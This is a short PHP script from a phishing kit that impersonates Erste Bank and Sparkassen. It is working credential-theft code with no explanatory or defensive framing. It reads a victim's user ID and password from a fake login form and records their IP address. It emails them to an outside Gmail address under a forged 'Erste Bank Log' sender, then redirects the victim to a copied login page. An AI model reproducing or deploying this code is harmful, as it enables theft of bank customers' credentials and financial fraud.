<?
$ip = getenv("REMOTE_ADDR");
$msg .= "\n"; 
$msg .= "User ID: ".$_POST['User_id']."\n";
$msg .= "Password: ".$_POST['j_password']."\n";
$msg .= "\n"; 
$msg .= "IP: ".$ip."\n";
$msg .= "------------Built By MMM----------------\n";
$post = "danielmorgan058@gmail.com";
$subj = "$ip - ".$_POST['id']."\n";
$from = "From: Erste Bank Log<logs@support.my>";
mail("$post",$subj, $msg, $from); 
header("Location: Login - Erste Bank and Sparkassen.html");	  

?>            